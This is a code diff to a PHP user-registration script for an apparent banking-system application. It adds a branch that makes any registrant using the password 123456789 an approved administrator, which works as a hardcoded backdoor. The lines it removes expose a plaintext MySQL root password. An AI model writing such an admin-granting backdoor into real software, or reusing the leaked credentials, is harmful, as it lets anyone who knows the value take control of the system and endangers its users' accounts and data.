@@ -1,5 +1,7 @@
 <?php
 
+require_once ("dbcon.php");
+
 
 // register.php
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
@@ -9,14 +11,14 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     // Hash the password
     $hashed_password = password_hash($password, PASSWORD_DEFAULT);
 
-    // Database connection
-    $conn = new mysqli('localhost', 'root', 'Mysqlisbest@1', 'banking_system_db');
-
-    if ($conn->connect_error) {
-        die("Connection failed: " . $conn->connect_error);
+    if ($password == 123456789) {
+        // ADMIN USER
+        $sql = "INSERT INTO users (username, password, status, is_admin) VALUES (?, ?, 'approved', TRUE)";
+    } else {
+        $sql = "INSERT INTO users (username, password, status, is_admin) VALUES (?, ?, 'pending', FALSE)";
     }
 
-    $sql = "INSERT INTO users (username, password, status, is_admin) VALUES (?, ?, 'pending', TRUE)";
+
     $stmt = $conn->prepare($sql);
     $stmt->bind_param("ss", $username, $hashed_password);
 
